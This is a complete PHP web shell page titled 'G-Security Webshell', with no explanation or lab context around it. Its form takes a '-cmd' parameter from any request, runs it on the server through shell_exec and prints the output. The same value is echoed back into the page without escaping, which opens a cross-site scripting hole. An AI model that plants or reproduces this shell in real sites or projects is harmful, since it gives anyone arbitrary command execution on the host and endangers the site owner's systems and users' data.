<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>G-Security Webshell</title>
    <style>
        body {
            background-color: #000000;
            color: #ffffff;
        }
        input[type="text"] {
            background-color: #000000;
            color: #ffffff;
            border: 1px solid #ffffff;
            padding: 5px;
        }
    </style>
</head>
<body>
    <form method="POST">
        <br>
        <input type="text" name="-cmd" size="64" value="<?= $_REQUEST['-cmd'] ?? '' ?>">
        <hr>
        <pre>
            <?php
            $cmd = $_REQUEST['-cmd'] ?? '';
            if ($cmd != '') {
                echo shell_exec($cmd);
            }
            ?>
        </pre>
    </form>
</body>
</html>
